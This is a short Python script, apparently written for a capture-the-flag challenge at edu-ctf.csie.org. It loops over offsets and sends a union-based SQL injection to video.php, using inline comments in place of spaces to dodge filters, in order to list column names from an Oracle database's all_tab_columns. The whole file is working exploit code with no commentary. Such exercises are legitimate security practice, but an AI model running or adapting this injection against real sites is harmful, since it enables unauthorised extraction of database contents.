import requests

for i in range(250):
    payload = 'vid=-1/**/union/**/select/**/null,column_name,null/**/from/**/all_tab_columns/**/where/**/table_name/**/in/**/(select/**/table_name/**/from/**/all_tables/**/order/**/by/**/table_name/**/offset/**/44/**/rows)/**/offset/**/{}/**/rows--'.format(i)
    res = requests.get('https://edu-ctf.csie.org:10159/video.php?'+payload, verify=False)
    print(i, res.text.split('\n')[69][4:-5])